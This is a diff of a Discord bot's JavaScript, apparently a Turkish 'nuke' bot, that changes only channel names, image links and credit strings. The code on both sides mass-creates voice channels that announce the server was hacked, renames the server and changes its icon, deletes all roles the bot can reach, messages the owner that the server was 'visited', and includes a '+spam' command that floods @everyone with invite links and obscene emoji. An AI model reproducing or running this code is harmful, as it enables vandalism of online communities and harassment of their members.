@@ -995,21 +995,21 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("Bir Siyahı", {
+      .createChannel("AxxA", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Var", {
+      .createChannel("AxxA", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-      .createChannel("Bir Beyazı", {
+      .createChannel("AxxA", {
         type: "voice"
       })
       .then(chan => {
@@ -1023,28 +1023,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Tarikatımız", {
+      .createChannel("AxxA", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("Sonsuz", {
+      .createChannel("AxxA", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Korkusuz", {
+      .createChannel("AxxA", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("And Acımasızlar'dan", {
+      .createChannel("AxxA", {
         type: "voice"
       })
       .then(chan => {
@@ -1058,14 +1058,14 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Oluşuyor", {
+      .createChannel("AxxA", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Kendi Dünyamızda", {
+      .createChannel("AxxA", {
         type: "voice"
       })
       .then(chan => {
@@ -1080,21 +1080,21 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("Kendimizin Tanrısıyız", {
+      .createChannel("AxxA", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Aslındaa", {
+      .createChannel("AxxA", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Masum İnsanlarız", {
+      .createChannel("AxxA", {
         type: "voice"
       })
       .then(chan => {
@@ -1108,21 +1108,21 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Fakat Bizi", {
+      .createChannel("AxxA", {
         type: "voice"     ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("Siz İnsanlar", {
+      .createChannel("AxxA", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("BozupAndDeğiştirdiniz...", {
+      .createChannel("AxxA...", {
         type: "voice"
       })
       .then(chan => {
@@ -1150,7 +1150,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-    .createChannel("ééééééééééééééééééééAxo", {
+    .createChannel("Made By Clowsia XD", {
         type: "voice"
       })
       .then(chan => {
@@ -1165,21 +1165,21 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("BU SUNUCU", {
+      .createChannel("Made By Clowsia XD", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
+      .createChannel("Made By Clowsia XD", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
+      .createChannel("Made By Clowsia XD", {
         type: "voice"
       })
       .then(chan => {
@@ -1193,28 +1193,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
+      .createChannel("Made By Clowsia XD", {
         type: "voice"
       })  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("SONSUZ", {
+      .createChannel("Made By Clowsia XD", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AFFETMEYİZ", {
+      .createChannel("Made By Clowsia XD", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("YENİLMEYİZ", {
+      .createChannel("Made By Clowsia XD", {
         type: "voice"
       })
       .then(chan => {
@@ -1228,14 +1228,14 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
+      .createChannel("Made By Clowsia XD", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("DOĞACAĞIZ", {
+      .createChannel("Geçirdik...", {
         type: "voice"
       })
       .then(chan => {
@@ -1249,10 +1249,10 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     
-    await msg.guild.setIcon("https://media.discordapp.net/attachments/877516964942184498/879643666799558656/xx.PNG");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
-    await msg.guild.setName("AxxA Clowsia Uğradı."); //SUNUCUNUN ISMINI DEGISTIRIR
+    await msg.guild.setIcon("https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
+    await msg.guild.setName("AxxA & Clowsia Uğradı."); //SUNUCUNUN ISMINI DEGISTIRIR
     await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
-    await client.user.setAvatar("https://media.discordapp.net/attachments/877516964942184498/879643666799558656/xx.PNG"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
+    await client.user.setAvatar("https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
     await client.user.setUsername("Complo");    //BOTUN ISMİNİ DEGISTIRIR
     await msg.guild.owner.send("**'A'xx'A' ' Dan İleti : Sunucuna Uğradım...'**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
     
@@ -1457,7 +1457,7 @@ client.on("message", async msg => {
 
 client.on('message', msg => {
   if (msg.content === '+spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
-        msg.channel.send('**https://discord.gg/MP2KYajVWp** @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('**Sakinleş dostum giden sunucu olsun ** @everyone :middle_finger: :ok_hand:'); 
         msg.channel.send('**https://discord.gg/MP2KYajVWp** @everyone :middle_finger: :ok_hand:'); 
         msg.channel.send('**https://discord.gg/MP2KYajVWp** @everyone :middle_finger: :ok_hand:'); 
         msg.channel.send('**https://discord.gg/MP2KYajVWp** @everyone :middle_finger: :ok_hand:'); 
